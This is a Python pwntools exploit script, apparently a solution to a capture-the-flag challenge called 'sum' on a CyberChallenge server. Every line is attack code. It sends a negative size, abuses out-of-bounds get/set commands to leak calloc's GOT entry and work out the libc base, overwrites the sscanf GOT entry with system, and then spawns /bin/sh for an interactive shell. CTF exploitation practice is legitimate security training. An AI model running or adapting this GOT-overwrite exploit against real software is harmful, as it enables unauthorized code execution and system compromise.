#!/usr/bin/env python3
from pwn import *

bin_name = "./sum_patched"
elf = context.binary = ELF(bin_name)
libc  = ELF("./libc.so.6")
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b calculator\ncontinue\n')
    elif args.REMOTE:
        return remote("sum.challs.cyberchallenge.it", 9134)
    else:
        return process(elf.path)

def main():
    r = conn() 
    r.sendlineafter(b'\n>',b'-1')
    print(libc.got['calloc'])
    payload = f"get {elf.got['calloc']//8}"
    r.sendlineafter(b'\n>',payload.encode())
    leak = r.recvline().decode().strip()
    print(leak)
    print(type(leak))
    libc.address = int(leak) - libc.sym['calloc']
    payload = f"set {elf.got['__isoc99_sscanf']//8} {libc.sym['system']}"
    r.sendlineafter(b'\n>',payload)
    r.sendlineafter(b'\n>',b'/bin/sh')
    r.interactive()

if __name__ == "__main__":
    main()
